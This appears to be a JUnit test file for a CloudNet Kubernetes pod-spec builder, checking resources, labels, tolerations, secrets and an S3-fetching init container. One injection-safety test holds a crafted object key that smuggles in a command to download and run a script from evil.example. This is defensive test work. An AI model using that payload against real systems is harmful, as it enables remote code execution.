package eu.cloudnetservice.modules.kubernetes.impl.pod;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.cloudnetservice.modules.kubernetes.config.KubernetesConfiguration;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

class PodSpecBuilderTest {

  private static final UUID ID = UUID.fromString("a3f9c2e1-4b7d-4c2a-9f11-8e6d0a5b3c74");

  private PodSpecBuilder builder;
  private PodSpecBuilder.PodRequest request;

  @BeforeEach
  void setUp() {
    this.builder = new PodSpecBuilder(KubernetesConfiguration.builder().build());
    this.request = new PodSpecBuilder.PodRequest(
      "Lobby-1", ID, "lobby", 4096, 25565, "node-1",
      "cloudnet-node-node-1-owner", "6f1c9f0e-1111-2222-3333-444455556666",
      null, "services/cn-lobby-1-a3f9c2e1.tar",
      List.of("java", "-Xmx4096M", "-cp", "/cloudnet/libs/*", "Main"));
  }

  @Test
  void consoleRequiresStdinWithoutStdinOnce() {
    var container = this.builder.build(this.request).getSpec().getContainers().getFirst();

    assertTrue(container.getStdin(), "stdin must be open for attach");
    // stdinOnce true closes stdin on first detach - console dead for good.
    assertFalse(container.getStdinOnce());
    // tty true multiplexes stdout/stderr and translates CRLF.
    assertFalse(container.getTty());
  }

  @Test
  void restartPolicyIsNeverSoCloudNetOwnsTheLifecycle() {
    assertEquals("Never", this.builder.build(this.request).getSpec().getRestartPolicy());
  }

  @Test
  void addressIsDeterministicViaHostnameAndSubdomain() {
    var spec = this.builder.build(this.request).getSpec();

    assertEquals("cn-lobby-1-a3f9c2e1", spec.getHostname());
    assertEquals("cloudnet-services", spec.getSubdomain());
  }

  @Test
  void memoryRequestEqualsLimitAndCpuHasNoLimit() {
    var resources = this.builder.build(this.request).getSpec()
      .getContainers().getFirst().getResources();

    assertEquals("5529Mi", resources.getRequests().get("memory").toString());
    assertEquals("5529Mi", resources.getLimits().get("memory").toString());
    assertNull(resources.getLimits().get("cpu"), "a cpu limit causes CFS throttling");
  }

  @Test
  void activeDeadlineActsAsKubeletSideBackstop() {
    assertEquals(86400L, this.builder.build(this.request).getSpec().getActiveDeadlineSeconds());
  }

  @Test
  void ownerReferencePointsAtConfigMapNotAtTheNodePod() {
    var owner = this.builder.build(this.request).getMetadata().getOwnerReferences().getFirst();

    assertEquals("ConfigMap", owner.getKind());
    assertEquals("cloudnet-node-node-1-owner", owner.getName());
    assertFalse(owner.getController());
  }

  @Test
  void gameserverGetsNoApiAccess() {
    var spec = this.builder.build(this.request).getSpec();

    assertFalse(spec.getAutomountServiceAccountToken());
    assertFalse(spec.getEnableServiceLinks());
  }

  @Test
  void labelsAllowTheInformerToSelectOurPods() {
    var labels = this.builder.build(this.request).getMetadata().getLabels();

    assertEquals("service", labels.get("cloudnet.eu/component"));
    assertEquals("lobby", labels.get("cloudnet.eu/task"));
    assertEquals("node-1", labels.get("cloudnet.eu/managed-by"));
    assertEquals(ID.toString(), labels.get("cloudnet.eu/service-id"));
  }

  @Test
  void wrapperSecretIsMountedReadOnly() {
    var mount = this.builder.build(this.request).getSpec().getContainers().getFirst()
      .getVolumeMounts().stream()
      .filter(m -> m.getName().equals("wrapper-config"))
      .findFirst().orElseThrow();

    assertEquals("/cloudnet/wrapper", mount.getMountPath());
    assertTrue(mount.getReadOnly());
  }

  @Test
  void perTaskImageOverridesTheModuleDefault() {
    var overridden = new PodSpecBuilder.PodRequest(
      "Lobby-1", ID, "lobby", 4096, 25565, "node-1",
      "owner", "uid", "ghcr.io/example/custom:1.0", "services/x.tar", List.of("java"));

    assertEquals("ghcr.io/example/custom:1.0",
      this.builder.build(overridden).getSpec().getContainers().getFirst().getImage());
  }

  @Test
  void initContainerFetchesTheStagedDirectoryBeforeTheServerStarts() {
    // The archive has to land before the main container starts, so the transfer never
    // eats into the wrapper's 30 second authentication window.
    var init = this.builder.build(this.request).getSpec().getInitContainers().getFirst();

    assertEquals("fetch-service-directory", init.getName());
    assertTrue(String.join(" ", init.getCommand()).contains("tar -xf"));
    // The key itself travels in the environment - see the injection test below.
    assertTrue(init.getEnv().stream()
      .anyMatch(e -> e.getName().equals("S3_OBJECT_KEY")
        && e.getValue().equals("services/cn-lobby-1-a3f9c2e1.tar")));
    assertTrue(init.getVolumeMounts().stream()
      .anyMatch(m -> m.getName().equals("service-dir")
        && m.getMountPath().equals("/cloudnet/service")));
  }

  @Test
  void initContainerPassesBucketAndKeyAsEnvironmentNotAsShellText() {
    // Interpolating either value into the /bin/sh -c string would let a crafted
    // config or object key run arbitrary commands in the init container.
    var init = this.builder.build(this.request).getSpec().getInitContainers().getFirst();
    var script = String.join(" ", init.getCommand());

    assertFalse(script.contains("services/cn-lobby-1-a3f9c2e1.tar"),
      "the object key must not appear literally in the shell script: " + script);
    assertTrue(script.contains("$S3_BUCKET"), script);
    assertTrue(script.contains("$S3_OBJECT_KEY"), script);

    var env = init.getEnv().stream()
      .collect(java.util.stream.Collectors.toMap(e -> e.getName(), e -> e));
    assertEquals("cloudnet-staging", env.get("S3_BUCKET").getValue());
    assertEquals("services/cn-lobby-1-a3f9c2e1.tar", env.get("S3_OBJECT_KEY").getValue());
  }

  @Test
  void shellMetacharactersInTheObjectKeyCannotEscapeIntoTheScript() {
    var malicious = new PodSpecBuilder.PodRequest(
      "Lobby-1", ID, "lobby", 4096, 25565, "node-1", "owner", "uid", null,
      "services/x.tar\"; curl http://evil.example/x | sh; #",
      List.of("java"));

    var init = this.builder.build(malicious).getSpec().getInitContainers().getFirst();
    var script = String.join(" ", init.getCommand());

    assertFalse(script.contains("curl"), "payload leaked into the script: " + script);
    assertTrue(init.getEnv().stream()
      .anyMatch(e -> e.getName().equals("S3_OBJECT_KEY") && e.getValue().contains("curl")),
      "the payload belongs in the environment, where it is inert data");
  }

  @Test
  void initContainerReadsCredentialsFromASecretNotFromTheSpec() {
    var envs = this.builder.build(this.request).getSpec().getInitContainers().getFirst().getEnv();

    var accessKey = envs.stream()
      .filter(e -> e.getName().equals("S3_ACCESS_KEY"))
      .findFirst().orElseThrow();
    assertNull(accessKey.getValue(), "credentials must never be inlined into the pod spec");
    assertEquals("cloudnet-staging-credentials",
      accessKey.getValueFrom().getSecretKeyRef().getName());
  }

  @Test
  void imagePullPolicyNeverBurnsTheAuthBudget() {
    // Always would add a registry round trip inside the wrapper's 30 second window.
    assertEquals("IfNotPresent",
      this.builder.build(this.request).getSpec().getContainers().getFirst().getImagePullPolicy());
  }

  @Test
  void taskNodeSelectorIsAppliedToThePodSpec() {
    var pod = this.builder.build(overrides(Map.of("pool", "gameservers"), null, null, null, null));

    assertEquals(Map.of("pool", "gameservers"), pod.getSpec().getNodeSelector());
  }

  @Test
  void podSpecHasNoNodeSelectorWhenTheTaskSetsNone() {
    var pod = this.builder.build(overrides(null, null, null, null, null));

    assertNull(pod.getSpec().getNodeSelector(), "an unset selector must not pin the pod to any node");
  }

  @Test
  void tolerationKeyYieldsAnExistsNoScheduleToleration() {
    var tolerations = this.builder.build(overrides(null, "gameservers", null, null, null))
      .getSpec().getTolerations();

    assertEquals(1, tolerations.size(), "exactly one toleration expected");
    assertEquals("gameservers", tolerations.getFirst().getKey());
    assertEquals("Exists", tolerations.getFirst().getOperator());
    assertEquals("NoSchedule", tolerations.getFirst().getEffect());
  }

  @Test
  void podSpecHasNoTolerationWhenTheTaskSetsNoKey() {
    assertNull(this.builder.build(overrides(null, null, null, null, null)).getSpec().getTolerations(),
      "no tolerationKey means no toleration at all");
  }

  @Test
  void cpuRequestOverrideReplacesTheModuleDefault() {
    var requests = this.builder.build(overrides(null, null, 4, null, null))
      .getSpec().getContainers().getFirst().getResources().getRequests();

    assertEquals("4", requests.get("cpu").toString());
  }

  @Test
  void memoryOverrideSetsRequestAndLimitToTheSameValue() {
    var resources = this.builder.build(overrides(null, null, null, 8192, null))
      .getSpec().getContainers().getFirst().getResources();

    assertEquals("8192Mi", resources.getRequests().get("memory").toString(), "request");
    assertEquals("8192Mi", resources.getLimits().get("memory").toString(), "limit");
  }

  @Test
  void memoryIsDerivedFromTheHeapWhenTheTaskSetsNoOverride() {
    var resources = this.builder.build(overrides(null, null, null, null, null))
      .getSpec().getContainers().getFirst().getResources();

    assertEquals("5529Mi", resources.getRequests().get("memory").toString());
  }

  @Test
  void priorityClassNameIsAppliedWhenSet() {
    assertEquals("high-gameserver",
      this.builder.build(overrides(null, null, null, null, "high-gameserver")).getSpec().getPriorityClassName());
  }

  @Test
  void priorityClassNameIsOmittedWhenNotSet() {
    assertNull(this.builder.build(overrides(null, null, null, null, null)).getSpec().getPriorityClassName());
  }

  @Test
  void taskLabelWithIllegalCharactersIsSanitisedToAValidLabelValue() {
    var withTask = new PodSpecBuilder.PodRequest(
      "Lobby-1", ID, "Lobby #1", 4096, 25565, "node-1",
      "owner", "uid", null, "services/x.tar", List.of("java"));

    var label = this.builder.build(withTask).getMetadata().getLabels().get("cloudnet.eu/task");

    assertEquals("Lobby--1", label);
  }

  private PodSpecBuilder.PodRequest overrides(
    Map<String, String> nodeSelector,
    String tolerationKey,
    Integer cpuRequest,
    Integer memoryMiB,
    String priorityClassName
  ) {
    return new PodSpecBuilder.PodRequest(
      "Lobby-1", ID, "lobby", 4096, 25565, "node-1",
      "owner", "uid", null, "services/x.tar", List.of("java"),
      nodeSelector, tolerationKey, cpuRequest, memoryMiB, priorityClassName);
  }
}
